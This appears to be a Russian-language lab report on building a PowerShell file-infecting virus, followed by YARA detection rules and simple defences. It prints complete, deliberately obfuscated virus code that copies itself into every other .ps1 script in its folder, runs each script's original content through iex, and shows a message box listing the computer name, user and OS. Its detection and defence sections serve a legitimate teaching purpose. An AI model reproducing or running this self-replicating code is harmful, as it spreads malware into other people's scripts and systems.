## Задачи

1. Реализовать **прототип вируса**, убедиться в возможности заражения других файлов.
2. Предложить **сигнатуру для обнаружения** антивирусом.
3. Предложить **варианты защиты** (при отсутствии антивируса).

---
## Решение

Сначала была реализована основная логика работы вируса, но так как зараженные файлы увеличивались в объеме с 1кб до 9кб, было принято решение уменьшить код и обфусцировать его для более сложного обнаружения. Как полезная нагрузка вируса выводится запланированная задача – окно с информацией о компьютере.

![](img/Pasted%20image%2020260107195854.png)


Код простого вируса

```powershell
$X="#INFECTED";$Y=$PSCommandPath;$Z=Split-Path $Y -Parent

function A($B){try{return (gc $B -ra)-match $X}catch{return $f}}

function C($D){if($D -eq $Y -or (A $D)){return $f}try{$E=gc $D -ra;$F=gc $Y -ra;$G=$F -split "`n#==";$H=$X+"`n"+$G[0]+"`n#===`n"+'try{iex @"'+"`n"+$E+"`n"+'"@}catch{}';sc $D $H -fo;return $t}catch{return $f}}

gci $Z *.ps1|?{$_.FullName -ne $Y}|%{C $_.FullName};$I="PC: $env:COMPUTERNAME`nUser: $env:USERNAME`nOS: $((gwmi Win32_OperatingSystem).Caption)";Add-Type -AssemblyName System.Windows.Forms;[System.Windows.Forms.MessageBox]::Show($I,"Info","OK","Info")
```

## Анализ


Для обнаружения вируса были предложены следующие YARA-правила для обнаружения сигнатур: прочтение своего имени файла и последовательные команды для самокопирования.

```yara
rule PS1_Virus_Self {
    strings:
        $self_path = "$PSCommandPath" nocase ascii
    condition:
        all of them
}

rule PS1_Virus_ReadWrite {
    strings:
       $self_read  = /gc\s+\$?[A-Za-z0-9_]{1,20}\s+-ra/i ascii
        $self_write = /sc\s+\$?[A-Za-z0-9_]{1,20}\s+\$?[A-Za-z0-9_]{1,20}\s+-fo/i ascii
    condition:
        all of them
}
```


Алгоритм работы вируса опирается на метку #INFECTED в начале файла. Если приписать такой комментарий, то файл не будет заражен. 

Также можно сравнивать объемы файлов. Если он изменился с помощью программы, а не пользователя, то надо проверить на наличие вируса.
